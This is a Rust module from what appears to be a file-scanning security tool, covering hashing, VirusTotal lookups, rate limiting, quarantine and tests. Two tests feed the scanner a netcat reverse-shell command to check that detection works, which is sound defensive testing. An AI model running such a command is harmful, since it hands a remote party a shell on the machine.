//! Hashing files, running the rules over them, and asking VirusTotal what it
//! knows about them.
//!
//! The rules and the archive reader live in `rules.rs` and `content.rs` and
//! need nothing from outside the machine. What they found is cached beside the
//! hash and thrown away when the rules change.
//!
//! Hashing is streamed in 8 KB blocks, so a 4 GB file costs 8 KB of memory,
//! and a file whose size and modification time are unchanged is never read.
//!
//! The free VirusTotal tier allows four requests a minute, so requests go
//! through a rate limiter, a scan spends a bounded budget of them, and the
//! cache is keyed by hash so identical files share one answer.
//!
//! What is sent is a 64-character hash and nothing else. Uploading contents is
//! a separate action, at `upload_file`.

use std::io::Read;
use std::path::Path;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Mutex;
use std::time::Duration;

use serde::Serialize;
use sha2::{Digest, Sha256};
use tokio::time::Instant;
use walkdir::WalkDir;

use crate::config::Config;
use crate::content::{self, ContentReport, Unchecked};
use crate::db;
use crate::state::{Action, Finding, Issue, IssueKind, IssueTarget, Severity};

/// How long a stored VirusTotal answer stays good.
const VERDICT_MAX_AGE: i64 = 7 * 24 * 60 * 60;

/// Read size for hashing.
const HASH_BUFFER: usize = 8192;

// --- hashing --------------------------------------------------------------

/// SHA-256 of a file, read in blocks so memory use does not follow size.
pub fn hash_file(path: &Path) -> std::io::Result<String> {
    let file = std::fs::File::open(path)?;
    let mut reader = std::io::BufReader::with_capacity(HASH_BUFFER, file);
    let mut hasher = Sha256::new();
    let mut buffer = [0u8; HASH_BUFFER];

    loop {
        let read = reader.read(&mut buffer)?;
        if read == 0 {
            break;
        }
        hasher.update(&buffer[..read]);
    }

    Ok(format!("{:x}", hasher.finalize()))
}

// --- choosing what to look at ---------------------------------------------

/// A file worth considering, with the facts that validate its cached hash.
#[derive(Debug, Clone)]
pub struct Candidate {
    pub path: String,
    pub size: u64,
    pub mtime: i64,
}

/// Extensions that can carry something executable, directly or in a wrapper.
const INTERESTING_EXTENSIONS: &[&str] = &[
    // programs and installers
    "sh", "bash", "zsh", "run", "appimage", "deb", "rpm", "exe", "msi", "bat", "cmd", "com", "scr",
    "jar", "apk", "dmg", "pkg", "bin", "elf", "so", "dll", "ps1", "vbs", "js", "py", "pl", "rb",
    "php", "desktop", "service", "reg", "hta", "wsf", "jse", "vbe",
    // archives, because what is inside them is usually the point
    "zip", "gz", "tgz", "bz2", "xz", "7z", "rar", "tar", "iso", "img", "cab", "lz", "zst",
];

/// Whether a file is worth hashing, by extension or by being executable.
pub fn is_interesting(path: &Path, executable: bool, deep: bool) -> bool {
    if deep || executable {
        return true;
    }

    let Some(ext) = path.extension().and_then(|e| e.to_str()) else {
        return false;
    };
    let ext = ext.to_ascii_lowercase();
    INTERESTING_EXTENSIONS.contains(&ext.as_str())
}

/// The first line of every CACHEDIR.TAG, from the Cache Directory Tagging
/// Specification. Cargo, pip and most build tools write it.
const CACHEDIR_SIGNATURE: &[u8] = b"Signature: 8a477f597d28d172789f06886806bc55";

/// Whether a folder holds generated files rather than anything a person put
/// there.
pub fn is_noise(dir: &Path, skip: &[String]) -> bool {
    let named = dir
        .file_name()
        .and_then(|name| name.to_str())
        .is_some_and(|name| skip.iter().any(|s| s == name));
    named || has_cachedir_tag(dir)
}

fn has_cachedir_tag(dir: &Path) -> bool {
    let Ok(file) = std::fs::File::open(dir.join("CACHEDIR.TAG")) else { return false };
    let mut head = Vec::with_capacity(CACHEDIR_SIGNATURE.len());
    file.take(CACHEDIR_SIGNATURE.len() as u64).read_to_end(&mut head).is_ok() && head == CACHEDIR_SIGNATURE
}

/// Walks the configured directories and returns what to check, newest first.
///
/// Newest first is what makes a budget-limited scan useful. What falls outside
/// the budget is reported as queued.
pub fn collect_candidates(paths: &[String], config: &Config) -> Vec<Candidate> {
    let max_bytes = config.max_file_bytes();
    let quarantine = crate::paths::quarantine_dir();
    let mut out: Vec<Candidate> = Vec::new();

    for raw in paths {
        let root = crate::paths::expand_tilde(raw);
        if !root.exists() {
            continue;
        }

        // Symlinks are not followed: a link to / would scan the whole disk.
        let walker = WalkDir::new(&root).max_depth(8).follow_links(false).into_iter();

        // The folder asked for is walked even when its own name is on the list.
        let keep = |e: &walkdir::DirEntry| {
            e.path() != quarantine
                && !(e.depth() > 0 && e.file_type().is_dir() && is_noise(e.path(), &config.skip_folders))
        };

        for entry in walker.filter_entry(keep).flatten() {
            if !entry.file_type().is_file() {
                continue;
            }
            let Ok(meta) = entry.metadata() else { continue };
            if meta.len() == 0 || meta.len() > max_bytes {
                continue;
            }

            if !is_interesting(entry.path(), crate::platform::is_executable(&meta), config.deep_scan) {
                continue;
            }

            out.push(Candidate {
                path: entry.path().to_string_lossy().into_owned(),
                size: meta.len(),
                mtime: modified_at(&meta),
            });
        }
    }

    // Two configured folders can overlap, /tmp holding a download folder for
    // one, and a file found twice is checked once.
    let mut seen = std::collections::HashSet::new();
    out.retain(|candidate| seen.insert(candidate.path.clone()));
    out.sort_by_key(|candidate| std::cmp::Reverse(candidate.mtime));
    out
}

// --- rate limiting --------------------------------------------------------

/// Keeps VirusTotal requests a fixed distance apart across the process.
///
/// The mutex is held while waiting, which is what serialises callers: two
/// scans at once still produce one request per interval.
pub struct RateLimiter {
    last: tokio::sync::Mutex<Option<Instant>>,
}

impl Default for RateLimiter {
    fn default() -> Self {
        Self::new()
    }
}

impl RateLimiter {
    pub fn new() -> Self {
        Self { last: tokio::sync::Mutex::new(None) }
    }

    /// Returns once it is this caller's turn to make a request.
    pub async fn acquire(&self, interval: Duration) {
        let mut last = self.last.lock().await;
        if let Some(previous) = *last {
            let ready_at = previous + interval;
            let now = Instant::now();
            if ready_at > now {
                tokio::time::sleep_until(ready_at).await;
            }
        }
        *last = Some(Instant::now());
    }
}

// --- VirusTotal -----------------------------------------------------------

#[derive(Debug, Clone, PartialEq)]
pub struct VtVerdict {
    /// Engines calling it malicious.
    pub malicious: u32,
    pub suspicious: u32,
    /// Engines that answered at all.
    pub total: u32,
    /// False when VirusTotal has never seen this hash.
    pub known: bool,
}

impl VtVerdict {
    pub fn unknown() -> Self {
        Self { malicious: 0, suspicious: 0, total: 0, known: false }
    }
}

/// The VirusTotal API, with the rate limit already applied.
pub struct VtClient<'a> {
    http: reqwest::Client,
    key: String,
    limiter: &'a RateLimiter,
    interval: Duration,
}

impl<'a> VtClient<'a> {
    pub fn new(key: String, limiter: &'a RateLimiter, interval: Duration) -> Result<Self, String> {
        let http = reqwest::Client::builder()
            .timeout(Duration::from_secs(45))
            .user_agent(concat!("grt-sentry/", env!("CARGO_PKG_VERSION")))
            .build()
            .map_err(|e| format!("Cannot create the HTTP client: {e}"))?;
        Ok(Self { http, key, limiter, interval })
    }

    /// Asks what is known about a hash, sending the hash and nothing else.
    pub async fn lookup(&self, hash: &str) -> Result<VtVerdict, String> {
        self.limiter.acquire(self.interval).await;

        let url = format!("https://www.virustotal.com/api/v3/files/{hash}");
        let response = self
            .http
            .get(&url)
            .header("x-apikey", &self.key)
            .send()
            .await
            .map_err(|e| format!("VirusTotal is unreachable: {e}"))?;

        // Not an error: no engine has ever been shown this file.
        if response.status() == reqwest::StatusCode::NOT_FOUND {
            return Ok(VtVerdict::unknown());
        }
        if response.status() == reqwest::StatusCode::UNAUTHORIZED {
            return Err("VirusTotal rejected the API key".to_string());
        }
        if response.status() == reqwest::StatusCode::TOO_MANY_REQUESTS {
            return Err("VirusTotal rate limit reached; the remaining files stay queued".to_string());
        }
        if !response.status().is_success() {
            return Err(format!("VirusTotal answered {}", response.status()));
        }

        let json: serde_json::Value =
            response.json().await.map_err(|e| format!("Unreadable answer from VirusTotal: {e}"))?;
        Ok(parse_verdict(&json))
    }

    /// Sends the file itself and waits for the report.
    ///
    /// VirusTotal keeps what it is given and shares it with the security
    /// industry. Never called by a scan, only by the button that says so.
    pub async fn upload_file(&self, path: &Path) -> Result<VtVerdict, String> {
        let bytes = std::fs::read(path).map_err(|e| format!("Cannot read {}: {e}", path.display()))?;

        // The plain endpoint accepts up to 32 MB. Larger files need a
        // negotiated URL, which the free tier does not always grant.
        if bytes.len() > 32 * 1024 * 1024 {
            return Err("The file is larger than the 32 MB VirusTotal accepts by this route".into());
        }

        let name = path.file_name().map(|n| n.to_string_lossy().into_owned()).unwrap_or_else(|| "file".into());
        let part = reqwest::multipart::Part::bytes(bytes).file_name(name);
        let form = reqwest::multipart::Form::new().part("file", part);

        self.limiter.acquire(self.interval).await;
        let response = self
            .http
            .post("https://www.virustotal.com/api/v3/files")
            .header("x-apikey", &self.key)
            .multipart(form)
            .send()
            .await
            .map_err(|e| format!("Upload failed: {e}"))?;

        if !response.status().is_success() {
            return Err(format!("VirusTotal answered {} to the upload", response.status()));
        }

        let json: serde_json::Value =
            response.json().await.map_err(|e| format!("Unreadable answer from VirusTotal: {e}"))?;
        let analysis_id = json["data"]["id"]
            .as_str()
            .ok_or_else(|| "VirusTotal did not return an analysis id".to_string())?
            .to_string();

        // Analysis takes seconds to minutes, and each poll costs a request,
        // so there are only a few before giving up.
        for _ in 0..10 {
            self.limiter.acquire(self.interval).await;
            let url = format!("https://www.virustotal.com/api/v3/analyses/{analysis_id}");
            let response = self
                .http
                .get(&url)
                .header("x-apikey", &self.key)
                .send()
                .await
                .map_err(|e| format!("VirusTotal is unreachable: {e}"))?;

            let json: serde_json::Value =
                response.json().await.map_err(|e| format!("Unreadable answer from VirusTotal: {e}"))?;

            if json["data"]["attributes"]["status"].as_str() == Some("completed") {
                let stats = &json["data"]["attributes"]["stats"];
                return Ok(stats_to_verdict(stats));
            }
        }

        Err("The analysis is still running. Scan the file again in a few minutes.".to_string())
    }
}

/// Pulls the counts out of a file report.
fn parse_verdict(json: &serde_json::Value) -> VtVerdict {
    stats_to_verdict(&json["data"]["attributes"]["last_analysis_stats"])
}

fn stats_to_verdict(stats: &serde_json::Value) -> VtVerdict {
    let count = |key: &str| stats[key].as_u64().unwrap_or(0) as u32;
    // Every engine that answered, which is what makes "34 of 71" mean
    // something.
    let total = stats
        .as_object()
        .map(|o| o.values().filter_map(|v| v.as_u64()).sum::<u64>())
        .unwrap_or(0) as u32;

    VtVerdict { malicious: count("malicious"), suspicious: count("suspicious"), total, known: total > 0 }
}

// --- verdict to issue -----------------------------------------------------

/// How many detections it takes to reach each severity.
///
/// One or two engines against seventy is usually a heuristic firing on a
/// packer, so it warns rather than alarms. Ten and above is not a difference
/// of opinion.
pub fn severity_for(verdict: &VtVerdict) -> Option<Severity> {
    if !verdict.known {
        return Some(Severity::Info);
    }
    match verdict.malicious {
        0 => None,
        1..=9 => Some(Severity::Warning),
        _ => Some(Severity::Critical),
    }
}

/// Builds the issue for a file from what VirusTotal said, if it was asked,
/// and what the rules found.
///
/// One file makes at most one issue, worded after the strongest evidence:
/// engines first, then rules, then whatever an archive kept from view.
pub fn file_finding(
    path: &str,
    hash: &str,
    verdict: Option<&VtVerdict>,
    content: &ContentReport,
    quarantined: bool,
) -> Option<Finding> {
    let severity = verdict.and_then(severity_for).max(content.severity())?;
    let flagged = verdict.filter(|v| v.known && v.malicious > 0);
    let unknown = verdict.is_some_and(|v| !v.known);

    let mut hits = content.hits.clone();
    hits.sort_by_key(|hit| std::cmp::Reverse(hit.severity));

    let (kind, title) = if let Some(verdict) = flagged {
        let word = if verdict.malicious >= 10 { "Malicious" } else { "Suspicious" };
        (IssueKind::MaliciousFile, format!("{word} file: flagged by {} engines", verdict.malicious))
    } else if let Some(worst) = hits.first() {
        let mut title = worst.title.clone();
        if worst.member.is_some() {
            title.push_str(", inside the archive");
        }
        let others = hits.iter().filter(|h| h.title != worst.title).count();
        if others > 0 {
            title.push_str(&format!(", and {others} more"));
        }
        (IssueKind::RuleMatch, title)
    } else if !content.unchecked.is_empty() {
        let title = if content.unchecked.iter().any(|u| matches!(u, Unchecked::Bomb { .. })) {
            "Possible decompression bomb"
        } else if content.unchecked.iter().any(|u| matches!(u, Unchecked::Encrypted { .. })) {
            "Archive protected by a password"
        } else {
            "Archive only partly checked"
        };
        (IssueKind::UncheckedArchive, title.to_string())
    } else {
        (IssueKind::UnknownFile, "File unknown to VirusTotal".to_string())
    };

    let mut paragraphs: Vec<String> = Vec::new();

    if let Some(verdict) = flagged {
        paragraphs.push(if verdict.malicious >= 10 {
            match verdict.total {
                0 => format!("{} engines call this file malicious.", verdict.malicious),
                total => format!("{} of {total} engines call this file malicious.", verdict.malicious),
            }
        } else {
            format!(
                "{} {} flag this file{}. A few detections against many clean results are often a heuristic reacting to how the file was packed, but the file is worth a decision either way.",
                verdict.malicious,
                match verdict.total {
                    0 => "engines".to_string(),
                    total => format!("of {total} engines"),
                },
                if verdict.suspicious > 0 { format!(", and {} more call it suspicious", verdict.suspicious) } else { String::new() }
            )
        });
    }

    for hit in hits.iter().take(10) {
        let place = match &hit.member {
            Some(member) => format!(", in {member}"),
            None => String::new(),
        };
        let mut text = format!("{}{place}. {}", hit.title, hit.detail);
        if let Some(sha256) = &hit.member_sha256 {
            text.push_str(&format!("\nSHA-256 of that file: {sha256}"));
        }
        paragraphs.push(text);
    }
    if hits.len() > 10 {
        paragraphs.push(format!("And {} more matches.", hits.len() - 10));
    }

    for unchecked in &content.unchecked {
        paragraphs.push(unchecked.sentence());
    }

    if unknown {
        paragraphs.push(
            "No VirusTotal engine has ever been shown this file, so there is no verdict from them either way. That is normal for something built locally or received from one person. Sending it for analysis uploads its contents."
                .to_string(),
        );
    }

    if quarantined {
        paragraphs.push("Quarantined automatically, as set in the settings.".to_string());
    }

    let mut actions = Vec::new();
    if quarantined {
        actions.push(Action::new("restore", "Put back", false));
    } else {
        actions.push(Action::new("quarantine", "Quarantine", false));
        actions.push(Action::new("delete", "Delete", true));
    }
    if unknown {
        actions.push(Action::new("upload_vt", "Send for analysis", true));
    }
    actions.push(Action::new("trust", "Trust this file", false));
    actions.push(Action::ignore());

    Some(Finding::new(
        Issue {
            kind,
            severity,
            title,
            location: path.to_string(),
            detail: Some(paragraphs.join("\n\n")),
            actions,
            ..Default::default()
        },
        IssueTarget::File { path: path.to_string(), sha256: hash.to_string() },
    ))
}

// --- the scan itself ------------------------------------------------------

/// Progress, as the interface draws it.
#[derive(Serialize, Clone, Debug)]
pub struct ScanProgress {
    /// "collecting", "hashing", "checking", "done".
    pub phase: String,
    pub current: u32,
    pub total: u32,
    /// The file being worked on, or what is happening.
    pub message: String,
}

#[derive(Default)]
pub struct ScanOutcome {
    pub findings: Vec<Finding>,
    pub files_checked: u32,
    /// Hashed, but left without an answer when the budget ran out.
    pub queued: u32,
    /// Facts about the scan itself, such as a missing key.
    pub notes: Vec<String>,
}

/// Hashes and checks the configured directories.
///
/// The database mutex is taken per statement and released before anything
/// slow, so the interface keeps working during a scan.
pub async fn run_scan(
    db: &Mutex<rusqlite::Connection>,
    config: &Config,
    limiter: &RateLimiter,
    cancel: &AtomicBool,
    paths: &[String],
    progress: &(dyn Fn(ScanProgress) + Sync),
) -> ScanOutcome {
    let mut outcome = ScanOutcome::default();

    progress(ScanProgress {
        phase: "collecting".into(),
        current: 0,
        total: 0,
        message: "Looking for files to check".into(),
    });

    let candidates = collect_candidates(paths, config);
    let total = candidates.len() as u32;

    let api_key = config.api_key();
    let client = match &api_key {
        Some(key) => match VtClient::new(key.clone(), limiter, Duration::from_secs(config.vt_interval_seconds)) {
            Ok(client) => Some(client),
            Err(e) => {
                outcome.notes.push(e);
                None
            }
        },
        None => None,
    };

    if client.is_none() && api_key.is_none() {
        outcome.notes.push(
            "No VirusTotal API key is set, so files were checked against GRT \
             Sentry's own rules only, and not against VirusTotal's engines. The \
             key goes in Settings."
                .to_string(),
        );
    }

    // Without rules every file would come back unreadable, so the gap is said
    // once and the contents are left alone.
    let rules_ready = match crate::rules::ready() {
        Ok(()) => true,
        Err(e) => {
            outcome.notes.push(e);
            false
        }
    };
    let limits = content::Limits::for_config(config);

    let mut budget = config.vt_budget_per_scan;

    for (index, candidate) in candidates.iter().enumerate() {
        if cancel.load(Ordering::Relaxed) {
            outcome.notes.push("The scan was stopped before it finished.".to_string());
            break;
        }

        progress(ScanProgress {
            phase: "hashing".into(),
            current: index as u32 + 1,
            total,
            message: candidate.path.clone(),
        });

        // 1. The hash, from the cache when the file has not changed.
        let cached = {
            let conn = db.lock().unwrap();
            db::cached_file(&conn, &candidate.path, candidate.size, candidate.mtime)
        };

        let (hash, mut known_verdict, stored_content) = match cached {
            // A verdict older than a week is treated as no verdict.
            Some(entry) => {
                let fresh = entry
                    .vt_checked
                    .map(|checked| crate::db::now() - checked <= VERDICT_MAX_AGE)
                    .unwrap_or(false);
                // Results from older rules are thrown away.
                let stored = entry
                    .content
                    .filter(|_| entry.content_version.as_deref() == Some(crate::rules::version()))
                    .and_then(|json| serde_json::from_str::<ContentReport>(&json).ok());
                (entry.sha256, entry.vt_verdict.filter(|_| fresh), stored)
            }
            None => {
                let path = candidate.path.clone();
                let hashed = tokio::task::spawn_blocking(move || hash_file(Path::new(&path))).await;
                match hashed {
                    Ok(Ok(hash)) => {
                        let conn = db.lock().unwrap();
                        let _ = db::put_file(&conn, &candidate.path, &hash, candidate.size, candidate.mtime);
                        // Another file with the same contents may already
                        // have an answer worth reusing.
                        let reused = db::verdict_for_hash(&conn, &hash, VERDICT_MAX_AGE);
                        (hash, reused, None)
                    }
                    // Unreadable or gone since the walk, which is not a
                    // finding.
                    _ => continue,
                }
            }
        };

        outcome.files_checked += 1;

        // 2. A file the user has vouched for is not examined further.
        {
            let conn = db.lock().unwrap();
            if crate::allowlist::contains(&conn, &hash) {
                continue;
            }
        }

        // 3. What is inside, offline, from the cache when the rules have not
        // changed since.
        let content = match stored_content {
            Some(stored) => stored,
            None if rules_ready => {
                let path = candidate.path.clone();
                let limits = limits.clone();
                let report = tokio::task::spawn_blocking(move || content::inspect(Path::new(&path), &limits))
                    .await
                    .unwrap_or_default();
                if let Ok(json) = serde_json::to_string(&report) {
                    let conn = db.lock().unwrap();
                    let _ = db::put_content(&conn, &candidate.path, crate::rules::version(), &json);
                }
                report
            }
            None => ContentReport::default(),
        };

        // 4. The verdict, reused or asked for or postponed.
        let verdict = match known_verdict.take() {
            Some(malicious) => Some(VtVerdict {
                malicious: malicious.max(0) as u32,
                suspicious: 0,
                // The engine count is not cached, so the message omits the
                // total in this case.
                total: 0,
                known: true,
            }),
            None => match &client {
                Some(client) if budget > 0 => {
                    budget -= 1;
                    progress(ScanProgress {
                        phase: "checking".into(),
                        current: index as u32 + 1,
                        total,
                        message: format!("Asking VirusTotal about {}", short_name(&candidate.path)),
                    });

                    match client.lookup(&hash).await {
                        Ok(verdict) => {
                            let conn = db.lock().unwrap();
                            let _ = db::put_verdict(&conn, &hash, verdict.malicious as i64);
                            Some(verdict)
                        }
                        Err(e) => {
                            // A network failure must not abort the scan, and
                            // identical notes are recorded once.
                            if !outcome.notes.contains(&e) {
                                outcome.notes.push(e);
                            }
                            budget = 0;
                            outcome.queued += 1;
                            None
                        }
                    }
                }
                Some(_) => {
                    outcome.queued += 1;
                    None
                }
                None => None,
            },
        };

        // 5. What to do about it. Only the engines quarantine on their own:
        // a rule is a reason to look, not to move files.
        let mut quarantined = false;
        if let Some(verdict) = &verdict {
            if config.auto_quarantine && verdict.known && verdict.malicious >= config.auto_quarantine_threshold {
                let conn = db.lock().unwrap();
                match crate::quarantine::quarantine_file(
                    &conn,
                    &candidate.path,
                    &format!("flagged by {} engines", verdict.malicious),
                ) {
                    Ok(_) => quarantined = true,
                    Err(e) => outcome.notes.push(format!("Automatic quarantine failed: {e}")),
                }
            }
        }

        if let Some(finding) = file_finding(&candidate.path, &hash, verdict.as_ref(), &content, quarantined) {
            outcome.findings.push(finding);
        }
    }

    if outcome.queued > 0 {
        outcome.notes.push(format!(
            "{} files are hashed and waiting for a verdict. The free VirusTotal \
             tier allows four requests a minute, so they are checked over the \
             next scans, newest first.",
            outcome.queued
        ));
    }

    progress(ScanProgress {
        phase: "done".into(),
        current: total,
        total,
        message: format!("{} files checked", outcome.files_checked),
    });

    outcome
}

/// The modification time as a whole number of seconds, which is what the
/// cache compares.
pub fn modified_at(metadata: &std::fs::Metadata) -> i64 {
    metadata
        .modified()
        .ok()
        .and_then(|time| time.duration_since(std::time::UNIX_EPOCH).ok())
        .map(|d| d.as_secs() as i64)
        .unwrap_or(0)
}

/// Just the file name, for a progress line.
fn short_name(path: &str) -> String {
    Path::new(path)
        .file_name()
        .map(|n| n.to_string_lossy().into_owned())
        .unwrap_or_else(|| path.to_string())
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;

    #[test]
    fn the_hash_matches_the_reference_value_for_known_input() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("abc.txt");
        std::fs::write(&path, b"abc").unwrap();

        // The published SHA-256 of "abc".
        assert_eq!(
            hash_file(&path).unwrap(),
            "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad"
        );
    }

    #[test]
    fn hashing_reads_in_blocks_rather_than_loading_the_file() {
        // A file several times the buffer must hash the same as those bytes
        // hashed in one go.
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("big.bin");
        let chunk = vec![0x5au8; HASH_BUFFER * 3 + 17];
        std::fs::write(&path, &chunk).unwrap();

        let mut reference = Sha256::new();
        reference.update(&chunk);
        assert_eq!(hash_file(&path).unwrap(), format!("{:x}", reference.finalize()));
    }

    #[test]
    fn only_executables_and_archives_are_picked_up_unless_deep_scan_is_on() {
        assert!(is_interesting(Path::new("/tmp/setup.exe"), false, false));
        assert!(is_interesting(Path::new("/tmp/archive.tar.gz"), false, false));
        assert!(is_interesting(Path::new("/tmp/Thing.AppImage"), false, false));
        assert!(!is_interesting(Path::new("/tmp/notes.txt"), false, false));
        assert!(!is_interesting(Path::new("/tmp/photo.jpg"), false, false));

        // No extension but executable, which is the downloaded binary case.
        assert!(is_interesting(Path::new("/tmp/installer"), true, false));
        assert!(!is_interesting(Path::new("/tmp/installer"), false, false));

        // Deep scan takes everything.
        assert!(is_interesting(Path::new("/tmp/notes.txt"), false, true));
    }

    #[test]
    fn candidates_come_newest_first_and_respect_the_size_limit() {
        let dir = tempfile::tempdir().unwrap();
        let small = dir.path().join("a.sh");
        let big = dir.path().join("b.sh");
        let boring = dir.path().join("c.txt");

        std::fs::write(&small, b"#!/bin/sh\n").unwrap();
        std::fs::write(&boring, b"hello").unwrap();
        let mut file = std::fs::File::create(&big).unwrap();
        file.write_all(&vec![0u8; 3 * 1024 * 1024]).unwrap();
        drop(file);

        let config = Config { max_file_size_mb: 1, ..Default::default() };
        let found = collect_candidates(&[dir.path().to_string_lossy().into_owned()], &config);

        let names: Vec<_> = found.iter().map(|c| c.path.clone()).collect();
        assert!(names.iter().any(|p| p.ends_with("a.sh")));
        assert!(!names.iter().any(|p| p.ends_with("b.sh")), "over the size limit");
        assert!(!names.iter().any(|p| p.ends_with("c.txt")), "not an interesting type");
    }

    #[test]
    fn overlapping_folders_give_each_file_once() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(dir.path().join("inner")).unwrap();
        std::fs::write(dir.path().join("inner/a.sh"), b"#!/bin/sh\n").unwrap();
        std::fs::write(dir.path().join("b.sh"), b"#!/bin/sh\n").unwrap();

        let outer = dir.path().to_string_lossy().into_owned();
        let inner = dir.path().join("inner").to_string_lossy().into_owned();
        let found = collect_candidates(&[outer, inner], &Config::default());
        assert_eq!(found.len(), 2);
    }

    #[test]
    fn a_missing_directory_is_skipped_rather_than_fatal() {
        let config = Config::default();
        let found = collect_candidates(&["/nonexistent/place".to_string()], &config);
        assert!(found.is_empty());
    }

    #[test]
    fn the_thresholds_follow_the_specification() {
        let clean = VtVerdict { malicious: 0, suspicious: 0, total: 70, known: true };
        assert_eq!(severity_for(&clean), None);

        assert_eq!(severity_for(&VtVerdict::unknown()), Some(Severity::Info));

        let few = VtVerdict { malicious: 2, suspicious: 0, total: 70, known: true };
        assert_eq!(severity_for(&few), Some(Severity::Warning));

        let several = VtVerdict { malicious: 9, suspicious: 0, total: 70, known: true };
        assert_eq!(severity_for(&several), Some(Severity::Warning));

        let many = VtVerdict { malicious: 10, suspicious: 0, total: 70, known: true };
        assert_eq!(severity_for(&many), Some(Severity::Critical));
    }

    #[test]
    fn a_file_nobody_has_seen_is_reported_without_a_destructive_default() {
        let finding =
            file_finding("/tmp/mine.bin", "abc", Some(&VtVerdict::unknown()), &ContentReport::default(), false).unwrap();
        assert_eq!(finding.issue.kind, IssueKind::UnknownFile);
        assert_eq!(finding.issue.severity, Severity::Info);

        let upload = finding.issue.actions.iter().find(|a| a.id == "upload_vt").expect("offered");
        assert!(upload.destructive, "uploading contents must ask first");
    }

    #[test]
    fn a_rule_match_is_reported_with_no_key_and_named_after_the_rule() {
        let content = ContentReport { hits: crate::rules::scan_bytes(b"nc -e /bin/sh 10.0.0.1 4444").unwrap(), ..Default::default() };
        let finding = file_finding("/tmp/x.sh", "abc", None, &content, false).unwrap();
        assert_eq!(finding.issue.kind, IssueKind::RuleMatch);
        assert_eq!(finding.issue.severity, Severity::Critical);
        assert_eq!(finding.issue.title, "Reverse shell");
        assert!(!finding.issue.actions.iter().any(|a| a.id == "upload_vt"), "no key, nothing to upload to");
    }

    #[test]
    fn engines_and_rules_together_make_one_issue_at_the_worse_severity() {
        let content = ContentReport { hits: crate::rules::scan_bytes(b"nc -e /bin/sh 10.0.0.1 4444").unwrap(), ..Default::default() };
        let verdict = VtVerdict { malicious: 2, suspicious: 0, total: 70, known: true };
        let finding = file_finding("/tmp/x.sh", "abc", Some(&verdict), &content, false).unwrap();
        assert_eq!(finding.issue.kind, IssueKind::MaliciousFile);
        assert_eq!(finding.issue.severity, Severity::Critical, "the rule is worse than two engines");
        let detail = finding.issue.detail.unwrap();
        assert!(detail.contains("2 of 70 engines") && detail.contains("Reverse shell"));
    }

    #[test]
    fn a_clean_verdict_and_no_rule_match_make_no_issue() {
        let verdict = VtVerdict { malicious: 0, suspicious: 0, total: 70, known: true };
        assert!(file_finding("/tmp/x", "abc", Some(&verdict), &ContentReport::default(), false).is_none());
        assert!(file_finding("/tmp/x", "abc", None, &ContentReport::default(), false).is_none());
    }

    #[test]
    fn a_bomb_is_named_as_one() {
        let content = ContentReport {
            unchecked: vec![Unchecked::Bomb { member: "zeros.bin".into(), ratio: 200 }],
            ..Default::default()
        };
        let finding = file_finding("/tmp/x.zip", "abc", None, &content, false).unwrap();
        assert_eq!(finding.issue.kind, IssueKind::UncheckedArchive);
        assert_eq!(finding.issue.title, "Possible decompression bomb");
        assert_eq!(finding.issue.severity, Severity::Warning);
    }

    #[test]
    fn generated_folders_are_skipped_but_a_folder_asked_for_by_name_is_not() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        for folder in ["node_modules/pkg", "target/debug", "src"] {
            std::fs::create_dir_all(root.join(folder)).unwrap();
        }
        std::fs::write(root.join("node_modules/pkg/install.sh"), b"#!/bin/sh\n").unwrap();
        std::fs::write(root.join("target/CACHEDIR.TAG"), b"Signature: 8a477f597d28d172789f06886806bc55\n# cargo\n").unwrap();
        std::fs::write(root.join("target/debug/build.sh"), b"#!/bin/sh\n").unwrap();
        std::fs::write(root.join("src/run.sh"), b"#!/bin/sh\n").unwrap();

        let config = Config::default();
        let found = collect_candidates(&[root.to_string_lossy().into_owned()], &config);
        let names: Vec<_> = found.iter().map(|c| c.path.clone()).collect();
        assert_eq!(names.len(), 1, "{names:?}");
        assert!(Path::new(&names[0]).ends_with("src/run.sh"));

        // Pointed at directly, node_modules is scanned like anything else.
        let direct = collect_candidates(&[root.join("node_modules").to_string_lossy().into_owned()], &config);
        assert_eq!(direct.len(), 1);
    }

    #[test]
    fn a_cachedir_tag_without_the_signature_hides_nothing() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(dir.path().join("x")).unwrap();
        std::fs::write(dir.path().join("x/CACHEDIR.TAG"), b"please skip me").unwrap();
        assert!(!is_noise(&dir.path().join("x"), &[]));
    }

    #[test]
    fn the_counts_are_read_out_of_a_real_report_shape() {
        let json = serde_json::json!({
            "data": { "attributes": { "last_analysis_stats": {
                "harmless": 60, "malicious": 34, "suspicious": 2, "undetected": 5, "timeout": 0
            }}}
        });
        let verdict = parse_verdict(&json);
        assert_eq!(verdict.malicious, 34);
        assert_eq!(verdict.suspicious, 2);
        assert_eq!(verdict.total, 101);
        assert!(verdict.known);
    }

    #[test]
    fn an_empty_report_reads_as_never_seen() {
        let verdict = parse_verdict(&serde_json::json!({}));
        assert!(!verdict.known);
        assert_eq!(verdict.malicious, 0);
    }

    #[tokio::test(start_paused = true)]
    async fn requests_are_spaced_by_the_configured_interval() {
        let limiter = RateLimiter::new();
        let interval = Duration::from_secs(15);
        let started = Instant::now();

        // The first request is immediate, the rest wait their turn.
        for _ in 0..4 {
            limiter.acquire(interval).await;
        }

        assert_eq!(started.elapsed(), Duration::from_secs(45));
    }

    #[tokio::test(start_paused = true)]
    async fn a_caller_that_waited_long_enough_is_not_delayed_again() {
        let limiter = RateLimiter::new();
        limiter.acquire(Duration::from_secs(15)).await;
        tokio::time::sleep(Duration::from_secs(60)).await;

        let before = Instant::now();
        limiter.acquire(Duration::from_secs(15)).await;
        assert_eq!(before.elapsed(), Duration::ZERO);
    }

    #[tokio::test]
    async fn a_scan_without_an_api_key_still_hashes_and_says_why_it_stopped_there() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("a.sh"), b"#!/bin/sh\necho hello\n").unwrap();

        let db = Mutex::new(crate::db::open_memory());
        let config = Config { virustotal_api_key: None, ..Default::default() };
        let limiter = RateLimiter::new();
        let cancel = AtomicBool::new(false);

        let outcome = run_scan(
            &db,
            &config,
            &limiter,
            &cancel,
            &[dir.path().to_string_lossy().into_owned()],
            &|_| {},
        )
        .await;

